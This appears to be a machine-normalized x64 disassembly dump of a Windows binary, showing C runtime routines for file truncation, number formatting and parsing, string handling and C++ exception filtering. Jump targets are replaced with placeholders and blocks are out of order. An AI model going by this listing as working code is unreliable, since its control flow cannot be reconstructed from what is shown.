sub rsp 0x20
mov rbp rdx
xor edi edi
xor edx edx
lea r8d [ rdi + 0x1 ]
mov esi ecx
call sub_140050450
mov r13 rax
cmp rax 0xffffffffffffffff
je r-xdata
call sub_14003f1a4
mov eax [ rax ]
lea r8d [ rdi + 0x2 ]
xor edx edx
mov ecx esi
call sub_140050450
cmp rax 0xffffffffffffffff
je r-xdata
mov rbx rbp
sub rbx rax
test rbx rbx
jle r-xdata
jns r-xdata
call [ GetProcessHeap@IAT ]
mov r15d 0x1000
lea edx [ rdi + 0x8 ]
mov rcx rax
mov r8d r15d
call [ HeapAlloc@IAT ]
mov rbp rax
test rax rax
jne r-xdata
xor r8d r8d
mov rdx r13
mov ecx esi
call sub_140050450
cmp rax 0xffffffffffffffff
je r-xdata
xor r8d r8d
mov rdx rbp
mov ecx esi
call sub_140050450
cmp rax 0xffffffffffffffff
je r-xdata
mov edx 0x8000
mov ecx esi
call sub_14003be88
mov r12d eax
call sub_14003f1a4
mov [ rax ] 0xc
xor eax eax
jmp r-xdata
mov ecx esi
call sub_140046de8
mov rcx rax
call [ SetEndOfFile@IAT ]
neg eax
sbb rdi rdi
neg rdi
dec rdi
cmp rdi 0xffffffffffffffff
jne r-xdata
call sub_14003f1c4
cmp [ rax ] 0x5
jne r-xdata
cdqe
sub rbx rax
test rbx rbx
jle r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r15
pop r13
pop r12
retn
call sub_14003f1a4
mov [ rax ] 0xd
call sub_14003f1c4
mov rbx rax
call [ GetLastError@IAT ]
mov [ rbx ] eax
or rdi 0xffffffffffffffff
call sub_14003f1a4
mov [ rax ] 0xd
mov edx r12d
mov ecx esi
call sub_14003be88
call [ GetProcessHeap@IAT ]
mov r8 rbp
mov rcx rax
xor edx edx
call [ HeapFree@IAT ]
jmp r-xdata
jmp r-xdata
cmp rdi 0xffffffffffffffff
je r-xdata
mov r8d ebx
cmp rbx r15
mov rdx rbp
cmovge r8d r15d
mov ecx esi
call sub_14004eaf4
cmp eax 0xffffffff
je r-xdata
sub_140054b58
mov [ rsp + 0x10 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x27 ]
sub rsp 0xc0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x17 ] rax
movzx edi [ rcx + 0x8 ]
mov r10d [ rcx ]
mov rbx r9
mov r9d [ rcx + 0x4 ]
movzx ecx di
mov r11d 0x1
mov [ rbp - 0x4d ] edx
mov edx 0x8000
xor r13d r13d
and cx dx
lea r15d [ rdx - 0x1 ]
mov [ rbp - 0x39 ] r8d
and di r15w
mov [ rbp - 0x41 ] rbx
mov [ rbp - 0x9 ] 0xcccccccc
mov [ rbp - 0x5 ] 0xcccccccc
mov [ rbp - 0x1 ] 0x3ffbcccc
mov [ rbp - 0x67 ] cx
lea eax [ r11 + 0x1f ]
lea r8d [ r11 + 0x2c ]
test cx cx
je r-xdata
mov [ rbx + 0x2 ] al
mov [ rbx + 0x2 ] r8b
jmp r-xdata
cmp di r15w
jne r-xdata
test r9d r9d
jne r-xdata
test di di
jne r-xdata
movzx r8d di
mov ecx r9d
mov [ rbp - 0x13 ] r9d
shr ecx 0x18
mov eax r8d
mov [ rbp - 0x17 ] r10d
shr eax 0x8
lea r9 [ rw-data ]
mov esi 0x80000000
imul r8d r8d 0x4d10
lea edx [ rax + rcx * 2 ]
mov r12d 0x5
sub r9 0x60
mov [ rbp - 0xf ] di
mov [ rbp - 0x19 ] r13w
mov r14d 0xbffd
imul edx edx 0x4d
lea ecx [ rdx + r8 - 0x134312f4 ]
mov [ rbp - 0x49 ] r12d
lea edi [ rsi - 0x1 ]
sar ecx 0x10
movsx r10d cx
mov [ rbp - 0x61 ] ecx
neg r10d
je r-xdata
mov esi 0x80000000
mov [ rbx ] r11w
cmp r9d esi
jne r-xdata
test r10d r10d
jne r-xdata
mov r8d [ rbp - 0x15 ]
mov edx [ rbp - 0x19 ]
test r10d r10d
jns r-xdata
bt r9d 0x1e
jb r-xdata
test r10d r10d
je r-xdata
cmp cx dx
cmove eax r8d
mov ecx 0x8000
add cx r11w
mov r9d 0x8000
mov [ rbp - 0x65 ] r13d
lea r10d [ r9 - 0x1 ]
mov [ rbp - 0x61 ] ecx
movzx ecx [ rbp + 0x1 ]
movzx r15d cx
and cx r10w
mov [ rbp - 0x29 ] 0x0
xor r15w ax
and ax r10w
mov [ rbp - 0x21 ] r13d
and r15w r9w
lea r9d [ rax + rcx ]
cmp ax r10w
jae r-xdata
je r-xdata
lea r9 [ rw-data ]
neg r10d
sub r9 0x60
test r10d r10d
test cx cx
je r-xdata
lea rcx [ rbx + 0x4 ]
lea r8 [ r--data ]
mov edx 0x16
call sub_140042dcc
test eax eax
je r-xdata
mov eax r11d
mov rcx [ rbp + 0x17 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x108 ]
add rsp 0xc0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov r9d [ rbp - 0x11 ]
mov eax 0x15
mov [ rbp - 0xf ] r13w
mov esi [ rbp - 0x11 ]
cmp r12d eax
lea r10d [ rax - 0xd ]
cmovg r12d eax
shr r9d 0x10
sub r9d 0x3ffe
cwde
add r12d eax
test r12d r12d
jg r-xdata
neg r15w
sbb eax eax
and eax esi
add eax 0x7fff8000
mov [ rbp - 0x11 ] eax
cmp cx r10w
jae r-xdata
mov r8d [ rbp - 0x15 ]
mov edx [ rbp - 0x19 ]
cmp r9d esi
jne r-xdata
cmp r9d 0xc0000000
jne r-xdata
mov [ rbx + 0x3 ] 0x6
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
call sub_1400436bc
int3
mov ecx r8d
mov eax edx
add esi esi
add r8d r8d
shr eax 0x1f
shr ecx 0x1f
or r8d eax
or esi ecx
add edx edx
sub r10 r11
jne r-xdata
mov [ rbp - 0x15 ] r8d
mov [ rbp - 0x19 ] edx
test r9d r9d
jns r-xdata
cmp [ rbp - 0x67 ] cx
mov eax 0x20
lea ecx [ rax + 0xd ]
cmove eax ecx
jmp r-xdata
cmp r9w r14w
ja r-xdata
test r10d r10d
jne r-xdata
cdqe
lea rcx [ rax + rax * 2 ]
lea r14 [ r9 + rcx * 4 ]
mov r9d 0x8000
mov [ rbp - 0x31 ] r14
cmp [ r14 ] r9w
jb r-xdata
lea rcx [ rbx + 0x4 ]
lea r8 [ r--data ]
mov edx 0x16
call sub_140042dcc
test eax eax
jne r-xdata
test r10d r10d
jne r-xdata
test r10d r10d
jne r-xdata
lea r14d [ r12 + 0x1 ]
lea rdi [ rbx + 0x4 ]
mov r10 rdi
test r14d r14d
jle r-xdata
neg r9d
movzx r10d r9b
test r10d r10d
jle r-xdata
mov [ rbx + 0x3 ] 0x3001
mov r10d 0x3fbf
cmp r9w r10w
ja r-xdata
mov eax r10d
add r9 0x54
sar r10d 0x3
and eax 0x7
mov [ rbp - 0x51 ] r10d
mov [ rbp - 0x59 ] r9
je r-xdata
mov rbx [ rbp - 0x41 ]
mov ecx [ rbp - 0x61 ]
mov r14d 0xbffd
jmp r-xdata
movzx ecx [ r14 + 0xa ]
movzx eax [ rbp - 0xf ]
mov [ rbp - 0x65 ] r13d
movzx ebx cx
and cx r15w
mov [ rbp - 0x29 ] 0x0
xor bx ax
and ax r15w
mov [ rbp - 0x21 ] r13d
and bx r9w
lea r9d [ rax + rcx ]
mov [ rbp - 0x69 ] bx
cmp ax r15w
jae r-xdata
mov rcx [ r14 ]
mov eax [ r14 + 0x8 ]
lea r14 [ rbp + 0x7 ]
mov [ rbp + 0x7 ] rcx
shr rcx 0x10
mov [ rbp + 0xf ] eax
sub ecx r11d
mov [ rbp - 0x31 ] r14
mov [ rbp + 0x9 ] ecx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
call sub_1400436bc
int3
lea rcx [ rbx + 0x4 ]
lea r8 [ r--data ]
lea edx [ r10 + 0x16 ]
call sub_140042dcc
test eax eax
jne r-xdata
lea rcx [ rbx + 0x4 ]
lea r8 [ r--data ]
lea edx [ r10 + 0x16 ]
call sub_140042dcc
test eax eax
je r-xdata
sub r10 r11
mov al [ r10 ]
sub r10 r11
cmp al 0x35
jl r-xdata
mov r13 [ rbp - 0x19 ]
mov ecx r8d
add r8d r8d
shr ecx 0x1f
mov eax edx
add edx edx
shr eax 0x1f
lea r9d [ rsi + rsi ]
mov [ rbp + 0x7 ] r13
or r8d eax
or r9d ecx
mov eax edx
mov ecx r8d
shr eax 0x1f
add r8d r8d
or r8d eax
add edx edx
add r9d r9d
shr ecx 0x1f
mov eax r13d
lea r15d [ rax + rdx ]
or r9d ecx
cmp r15d edx
jb r-xdata
mov ecx r8d
mov eax esi
shr edx 0x1
shr r8d 0x1
shl eax 0x1f
shl ecx 0x1f
sub r10d r11d
shr esi 0x1
or r8d eax
or edx ecx
test r10d r10d
jg r-xdata
test ax ax
jne r-xdata
mov [ rbp - 0x11 ] r13d
jmp r-xdata
mov eax [ rbp - 0x11 ]
mov r9d 0x3fff
shr eax 0x10
cmp ax r9w
jb r-xdata
neg bx
cmp cx r15w
jae r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
call sub_1400436bc
int3
mov eax 0x5
mov [ rbx + 0x3 ] al
jmp r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
call sub_1400436bc
int3
cmp r10 rdi
jae r-xdata
jmp r-xdata
lea eax [ r8 + 0x1 ]
xor ecx ecx
cmp eax r8d
jb r-xdata
cmp r15d eax
jae r-xdata
mov [ rbp - 0x15 ] r8d
mov [ rbp - 0x19 ] edx
test cx cx
jne r-xdata
add r9w r11w
test [ rbp - 0x11 ] edi
jne r-xdata
mov edx r13d
mov r8d r13d
mov r15d 0xbffd
cmp r9w r15w
ja r-xdata
mov r11d r13d
jmp r-xdata
cmp [ r10 ] 0x30
jne r-xdata
cmp r10 rdi
jae r-xdata
cmp r10 rdi
jae r-xdata
mov ecx r11d
cmp eax r11d
jae r-xdata
shr r13 0x20
lea r12d [ r8 + r13 ]
cmp r12d r8d
jb r-xdata
mov edi r13d
lea rdx [ rbp - 0x29 ]
add r9w r11w
test [ rbp - 0x1 ] edi
jne r-xdata
test r8d r8d
jne r-xdata
mov r15d 0x7fff
mov ebx 0x3fbf
cmp r9w bx
ja r-xdata
sub r10 r11
sub r10b bl
sub r10b 0x3
movsx rax r10b
mov [ rbx + 0x3 ] r10b
mov [ rax + rbx + 0x4 ] r13b
mov eax 0x20
mov r9d 0x8000
mov [ rbx + 0x3 ] r11b
cmp [ rbp - 0x67 ] r9w
lea ecx [ rax + 0xd ]
mov [ rdi ] 0x30
cmove eax ecx
jmp r-xdata
cmp [ r10 ] 0x39
jne r-xdata
cmp r10 rdi
jae r-xdata
add r9d r11d
mov r8d eax
test ecx ecx
je r-xdata
add r9d r11d
cmp r12d r13d
jae r-xdata
sub r12d r11d
add rdx 0x2
add edi r11d
xor r13d r13d
mov [ rbp - 0x49 ] r12d
test r12d r12d
jg r-xdata
mov r14d edi
lea rsi [ rbp - 0x1 ]
lea r12 [ rbp + rcx - 0x19 ]
and r14d r11d
cmp [ rbp - 0x5 ] r13d
jne r-xdata
test edx edx
jne r-xdata
test ax ax
jne r-xdata
mov [ rbp - 0x15 ] 0x0
mov r15d 0x7fff
jmp r-xdata
mov [ rbx ] r13w
mov [ rbx + 0x2 ] al
mov [ rbx + 0x5 ] r13b
jmp r-xdata
mov [ r10 ] 0x30
sub r10 r11
add [ r10 ] r11b
add r10 r11
add [ rbx ] r11w
mov esi [ rbp - 0x11 ]
jmp r-xdata
add r9d esi
xor r13d r13d
mov eax r15d
shr eax 0x1f
lea r8d [ r12 + r12 ]
mov ecx r12d
or r8d eax
shr ecx 0x1f
lea eax [ r9 + r9 ]
or eax ecx
lea edx [ r15 + r15 ]
sub r14d r11d
mov [ rbp - 0x11 ] eax
shr eax 0x18
mov [ rbp - 0x19 ] edx
add al 0x30
mov [ rbp - 0x15 ] r8d
mov [ rbp - 0xe ] r13b
mov [ r10 ] al
add r10 r11
test r14d r14d
jle r-xdata
lea eax [ rdi + rdi ]
xor ebx ebx
mov r13d r12d
movsxd rcx eax
test r12d r12d
jle r-xdata
mov rbx [ rbp - 0x41 ]
mov r8d [ rbp - 0x21 ]
mov r10d [ rbp - 0x29 ]
mov eax 0xc002
mov esi 0x80000000
mov r12d 0xffff
add r9w ax
test r9w r9w
jle r-xdata
mov r8d r11d
cmp r10d ecx
jae r-xdata
cmp [ rbp - 0x9 ] r13d
je r-xdata
mov [ rbp - 0xf ] r13w
jmp r-xdata
test cx cx
jne r-xdata
add r9w r11w
test [ rbp - 0x11 ] edi
jne r-xdata
mov edx r13d
mov r8d r13d
mov [ rbp - 0x19 ] edx
add r9w r12w
jns r-xdata
test esi r8d
jne r-xdata
sub r13d r11d
add r12 0x2
sub rsi 0x2
test r13d r13d
jg r-xdata
add [ rdx + 0x4 ] r11w
mov [ rdx ] r10d
test r8d r8d
je r-xdata
mov esi r13d
lea r10 [ rbp - 0x29 ]
mov edi r12d
add r9w r11w
test [ r14 + 0x8 ] edi
jne r-xdata
test r8d r8d
jne r-xdata
movzx eax [ rbp - 0x29 ]
mov ebx [ rbp - 0x65 ]
movzx eax r9w
neg ax
movzx edx ax
add r9w dx
test r9w r9w
jg r-xdata
mov edi [ rbp - 0x25 ]
mov edx r10d
add r8d r8d
shr edx 0x1f
add r10d r10d
mov ecx edi
shr ecx 0x1f
lea eax [ rdi + rdi ]
add r9w r12w
or eax edx
or r8d ecx
mov [ rbp - 0x29 ] r10d
mov [ rbp - 0x25 ] eax
mov [ rbp - 0x21 ] r8d
test r9w r9w
jg r-xdata
movzx eax [ r12 ]
movzx ecx [ rsi ]
mov r8d ebx
imul ecx eax
mov eax [ rdx ]
lea r10d [ rax + rcx ]
cmp r10d eax
jb r-xdata
mov r12d [ rbp - 0x49 ]
sub edi r11d
add r10 0x2
add esi r11d
test edi edi
jg r-xdata
mov ebx esi
lea r13 [ r14 + 0x8 ]
lea r12 [ rbp + rcx - 0x19 ]
and ebx r11d
xor r14d r14d
cmp [ r14 + 0x4 ] r13d
jne r-xdata
test edx edx
jne r-xdata
mov eax [ rbp - 0x27 ]
or edx 0xffffffff
cmp eax edx
jne r-xdata
and r10d 0x1ffff
cmp r10d 0x18000
jne r-xdata
mov edi [ rbp - 0x25 ]
mov eax r8d
shr r10d 0x1
mov ecx edi
shl eax 0x1f
shr edi 0x1
shl ecx 0x1f
or edi eax
shr r8d 0x1
or r10d ecx
sub rdx r11
mov [ rbp - 0x25 ] edi
mov [ rbp - 0x29 ] r10d
jne r-xdata
add ebx r11d
lea eax [ rsi + rsi ]
mov r15d edi
movsxd rcx eax
test edi edi
jle r-xdata
mov r10d [ rbp - 0x21 ]
mov r8d [ rbp - 0x29 ]
mov eax 0xc002
add r9w ax
mov esi 0x80000000
mov ebx 0xffff
test r9w r9w
jle r-xdata
mov r8d r11d
cmp edx ecx
jae r-xdata
cmp [ r14 ] r13d
je r-xdata
mov [ rbp - 0xf ] r13w
mov r15d 0x7fff
jmp r-xdata
add eax r11d
mov [ rbp - 0x27 ] eax
mov eax [ rbp - 0x23 ]
mov [ rbp - 0x27 ] r13d
cmp eax edx
jne r-xdata
mov eax 0x7fff
cmp r9w ax
jb r-xdata
test [ rbp - 0x29 ] r11b
je r-xdata
test ebx ebx
mov rbx [ rbp - 0x41 ]
mov [ rbp - 0x21 ] r8d
je r-xdata
add r9w bx
jns r-xdata
test esi r10d
jne r-xdata
sub r15d r11d
add r12 0x2
sub r13 0x2
test r15d r15d
jg r-xdata
add [ r10 + 0x4 ] r11w
mov [ r10 ] edx
test r8d r8d
je r-xdata
mov r9 [ rbp - 0x59 ]
movzx eax [ rbp - 0x27 ]
or r9w r15w
mov [ rbp - 0x13 ] r8d
mov [ rbp - 0x19 ] ax
mov eax [ rbp - 0x25 ]
mov [ rbp - 0xf ] r9w
mov [ rbp - 0x17 ] eax
mov r8d [ rbp - 0x15 ]
mov edx [ rbp - 0x19 ]
jmp r-xdata
neg r15w
mov r8d r13d
mov edx r13d
sbb eax eax
and eax esi
add eax 0x7fff8000
mov [ rbp - 0x11 ] eax
jmp r-xdata
add eax r11d
mov [ rbp - 0x23 ] eax
movzx eax [ rbp - 0x1f ]
mov [ rbp - 0x23 ] r13d
cmp ax r12w
jne r-xdata
movzx eax r10w
or ax r11w
mov [ rbp - 0x29 ] ax
mov r10d [ rbp - 0x29 ]
jmp r-xdata
movzx eax [ rbp - 0x29 ]
movzx eax r9w
neg ax
movzx edx ax
add r9w dx
mov [ rbp - 0x5d ] r9w
mov r9d [ rbp - 0x65 ]
test r9w r9w
jg r-xdata
mov edi [ rbp - 0x25 ]
mov edx r8d
add r10d r10d
shr edx 0x1f
add r8d r8d
mov ecx edi
shr ecx 0x1f
lea eax [ rdi + rdi ]
add r9w bx
or eax edx
or r10d ecx
mov [ rbp - 0x29 ] r8d
mov [ rbp - 0x25 ] eax
mov [ rbp - 0x21 ] r10d
test r9w r9w
jg r-xdata
movzx eax [ r12 ]
movzx ecx [ r13 ]
mov r8d r14d
imul ecx eax
mov eax [ r10 ]
lea edx [ rax + rcx ]
cmp edx eax
jb r-xdata
mov r14 [ rbp - 0x31 ]
xor r13d r13d
mov eax [ rbp - 0x61 ]
mov r12d [ rbp - 0x4d ]
mov [ rbx ] ax
test [ rbp - 0x39 ] r11b
je r-xdata
add ax r11w
mov [ rbp - 0x1f ] ax
jmp r-xdata
mov [ rbp - 0x1f ] cx
add r9w r11w
jmp r-xdata
mov ecx 0x8000
cmp ax cx
ja r-xdata
mov eax [ rbp - 0x27 ]
or edx 0xffffffff
cmp eax edx
jne r-xdata
and r8d 0x1ffff
cmp r8d 0x18000
jne r-xdata
mov edi [ rbp - 0x25 ]
mov eax r10d
shr r8d 0x1
mov ecx edi
shl eax 0x1f
shr edi 0x1
shl ecx 0x1f
or edi eax
shr r10d 0x1
or r8d ecx
sub rdx r11
mov [ rbp - 0x25 ] edi
mov [ rbp - 0x29 ] r8d
jne r-xdata
add r9d r11d
mov r8d [ rbp - 0x21 ]
jmp r-xdata
add eax r11d
mov [ rbp - 0x27 ] eax
mov eax [ rbp - 0x23 ]
mov [ rbp - 0x27 ] r13d
cmp eax edx
jne r-xdata
mov r15d 0x7fff
mov r12d 0x5
mov edi 0x7fffffff
cmp r9w r15w
jb r-xdata
test [ rbp - 0x29 ] r11b
je r-xdata
test r9d r9d
movzx r9d [ rbp - 0x5d ]
mov [ rbp - 0x21 ] r10d
je r-xdata
movzx eax [ rbp - 0x27 ]
or r9w [ rbp - 0x69 ]
mov [ rbp - 0x13 ] r10d
mov r10d [ rbp - 0x51 ]
mov [ rbp - 0x19 ] ax
mov eax [ rbp - 0x25 ]
mov [ rbp - 0x17 ] eax
mov r8d [ rbp - 0x15 ]
mov edx [ rbp - 0x19 ]
mov [ rbp - 0xf ] r9w
jmp r-xdata
movzx eax [ rbp - 0x69 ]
mov r10d [ rbp - 0x51 ]
neg ax
jmp r-xdata
add eax r11d
mov [ rbp - 0x23 ] eax
movzx eax [ rbp - 0x1f ]
mov [ rbp - 0x23 ] r13d
cmp ax bx
jne r-xdata
movzx eax r8w
or ax r11w
mov [ rbp - 0x29 ] ax
mov r8d [ rbp - 0x29 ]
jmp r-xdata
sbb eax eax
mov [ rbp - 0x15 ] r13d
and eax esi
add eax 0x7fff8000
mov [ rbp - 0x11 ] eax
add ax r11w
mov [ rbp - 0x1f ] ax
jmp r-xdata
mov [ rbp - 0x1f ] cx
add r9w r11w
jmp r-xdata
mov ecx 0x8000
cmp ax cx
ja r-xdata
mov r10d [ rbp - 0x21 ]
jmp r-xdata
sub_140055604
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
mov rbx rcx
test rcx rcx
je r-xdata
xor eax eax
call sub_14003f7f0
mov rsi rax
lea rcx [ rax + 0x1 ]
call sub_14003ae78
mov rdi rax
test rax rax
je r-xdata
lea rdx [ rsi + 0x1 ]
mov r8 rbx
mov rcx rax
call sub_140042dcc
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_1400436bc
int3
mov rax rdi
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub_140055674
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
mov rbp rsp
sub rsp 0x40
mov rbx rcx
mov edi edx
lea rcx [ rbp - 0x20 ]
mov rdx r8
call sub_14003b928
xor esi esi
test rbx rbx
jne r-xdata
mov rdx [ rbp - 0x18 ]
cmp [ rdx + 0x8 ] esi
jne r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
movzx ecx [ rbx ]
test cx cx
je r-xdata
mov edx edi
mov rcx rbx
call sub_14003e9c0
xor eax eax
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
movzx eax cx
cmp edi eax
jne r-xdata
movzx eax cl
test [ rax + rdx + 0x1d ] 0x4
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x40
pop rbp
retn
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rbp - 0x8 ] sil
je r-xdata
cmp [ rbp - 0x8 ] sil
je r-xdata
movzx eax cx
cmp edi eax
je r-xdata
inc rbx
cmp [ rbx ] sil
je r-xdata
mov rax rbx
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
inc rbx
jmp r-xdata
movzx eax [ rbx ]
movzx ecx cx
shl ecx 0x8
or ecx eax
cmp edi ecx
jne r-xdata
lea rax [ rbx - 0x1 ]
jmp r-xdata
cmp [ rbp - 0x8 ] sil
je r-xdata
sub_1400557c8
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r15
sub rsp 0x10
and [ r8 ] 0x0
and [ r8 + 0x4 ] 0x0
and [ r8 + 0x8 ] 0x0
mov r10 r8
mov edi edx
mov r12 rcx
mov ebx 0x404e
test edx edx
je r-xdata
cmp [ r10 + 0x8 ] 0x0
jne r-xdata
xor r11d r11d
xor r8d r8d
xor r9d r9d
lea r15d [ r11 + 0x1 ]
mov r8d [ r10 + 0x8 ]
mov r11d 0x8000
test r11d r8d
jne r-xdata
mov r9d [ r10 + 0x4 ]
mov eax r15d
cmp ebp ecx
jae r-xdata
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov [ r10 + 0xa ] bx
mov rbx [ rsp + 0x30 ]
add rsp 0x10
pop r15
pop r13
pop r12
retn
mov r9d [ r10 + 0x4 ]
mov edx [ r10 ]
mov eax r9d
mov r8d r9d
shl eax 0x10
mov ecx edx
shr r8d 0x10
shr ecx 0x10
shl edx 0x10
mov [ r10 + 0x8 ] r8d
mov r9d ecx
mov [ r10 ] edx
or r9d eax
mov eax 0xfff0
add bx ax
mov [ r10 + 0x4 ] r9d
test r8d r8d
je r-xdata
shr rsi 0x20
xor eax eax
lea r11d [ r8 + rsi ]
cmp r11d r8d
jb r-xdata
mov eax r8d
inc r8d
xor ecx ecx
cmp r8d eax
jb r-xdata
mov [ r10 ] ebp
test eax eax
je r-xdata
mov eax [ r10 ]
mov edx r9d
add r8d r8d
mov ecx eax
add eax eax
shr edx 0x1f
shr ecx 0x1f
add r9d r9d
or r8d edx
or r9d ecx
mov [ r10 ] eax
mov eax 0xffff
add bx ax
mov [ r10 + 0x4 ] r9d
mov [ r10 + 0x8 ] r8d
test r11d r8d
je r-xdata
mov eax r15d
cmp r11d esi
jae r-xdata
mov ecx r15d
cmp r8d r15d
jae r-xdata
add r9d r13d
lea edx [ rbp + rbp ]
mov ecx r11d
shr ecx 0x1f
lea r8d [ r11 + r11 ]
add r9d r9d
or r9d ecx
mov eax ebp
mov [ r10 ] edx
shr eax 0x1f
mov [ r10 + 0x8 ] r9d
or r8d eax
xor eax eax
mov [ r10 + 0x4 ] r8d
movsx ecx [ r12 ]
lea r11d [ rdx + rcx ]
cmp r11d edx
jb r-xdata
add r9d r15d
mov [ r10 + 0x8 ] r9d
mov [ r10 + 0x4 ] r11d
test eax eax
je r-xdata
inc r9d
mov [ r10 + 0x8 ] r9d
mov [ r10 + 0x4 ] r8d
test ecx ecx
je r-xdata
mov eax r15d
cmp r11d ecx
jae r-xdata
add r12 r15
dec edi
mov [ r10 + 0x4 ] r8d
mov [ r10 + 0x8 ] r9d
jne r-xdata
mov eax r8d
inc r8d
xor ecx ecx
cmp r8d eax
jb r-xdata
mov [ r10 ] r11d
test eax eax
je r-xdata
mov rsi [ r10 ]
mov r13d [ r10 + 0x8 ]
mov ecx r8d
shr ecx 0x1f
add r8d r8d
add r9d r9d
or r9d ecx
lea edx [ r11 + r11 ]
mov eax r11d
shr eax 0x1f
add r9d r9d
mov [ rsp ] rsi
or r8d eax
mov eax edx
add edx edx
mov ecx r8d
shr eax 0x1f
add r8d r8d
shr ecx 0x1f
or r8d eax
xor eax eax
or r9d ecx
mov ecx esi
mov [ r10 ] edx
lea ebp [ rdx + rcx ]
mov [ r10 + 0x4 ] r8d
mov [ r10 + 0x8 ] r9d
cmp ebp edx
jb r-xdata
mov ecx r15d
cmp r8d r15d
jae r-xdata
inc r9d
mov [ r10 + 0x8 ] r9d
mov [ r10 + 0x4 ] r8d
test ecx ecx
je r-xdata
sub_140055a90
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x40 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x40 ] 0xfffffffe
lea rcx [ rw-data ]
add rcx 0x8
call sub_140003820
sub_140055abd
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x40 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x40 ] 0xfffffffe
lea rcx [ rw-data ]
add rcx 0x10
call sub_140003820
sub_140055ce2
push rbp
sub rsp 0x40
mov rbp rdx
lea rax [ rbp + 0x40 ]
mov [ rsp + 0x30 ] rax
mov rax [ rbp + 0x90 ]
mov [ rsp + 0x28 ] rax
mov rax [ rbp + 0x88 ]
mov [ rsp + 0x20 ] rax
mov r9 [ rbp + 0x80 ]
mov r8 [ rbp + 0x78 ]
mov rdx [ rbp + 0x70 ]
call sub_14003fb20
nop
add rsp 0x40
pop rbp
retn
sub_140055d9f
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rbp + 0x68 ] rcx
mov [ rbp + 0x58 ] rcx
mov rax [ rbp + 0x58 ]
mov rcx [ rax ]
mov [ rbp + 0x28 ] rcx
mov [ rbp + 0x20 ] 0x0
mov rax [ rbp + 0x28 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x18 ] 0x4
jne r-xdata
mov [ rbp + 0x30 ] 0x0
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x18 ] 0x4
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930520
je r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930520
je r-xdata
mov rdx [ rbp + 0x28 ]
mov rax [ rbp + 0xc8 ]
mov rcx [ rax + 0x28 ]
cmp [ rdx + 0x28 ] rcx
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930521
je r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930521
je r-xdata
mov [ rbp + 0x20 ] 0x1
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930522
jne r-xdata
call sub_140043c34
mov [ rax + 0x2c0 ] 0x1
mov [ rbp + 0x20 ] 0x1
mov [ rbp + 0x30 ] 0x1
jmp r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930522
jne r-xdata
mov eax [ rbp + 0x30 ]
add rsp 0x20
pop rbp
retn
sub_140055e9f
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rcx [ rbp + 0x50 ]
call sub_14003fdbc
cmp [ rbp + 0x20 ] 0x0
jne r-xdata
call sub_140043c34
mov rcx [ rbp + 0xd0 ]
mov [ rax + 0xf0 ] rcx
call sub_140043c34
mov rcx [ rbp + 0xd8 ]
mov [ rax + 0xf8 ] rcx
add rsp 0x28
pop rbp
pop rbx
retn
mov rbx [ rbp + 0xc8 ]
cmp [ rbx ] 0xe06d7363
jne r-xdata
cmp [ rbx + 0x18 ] 0x4
jne r-xdata
cmp [ rbx + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rbx + 0x28 ]
call sub_14003fd88
test eax eax
je r-xdata
cmp [ rbx + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rbx
call sub_1400403c4
nop
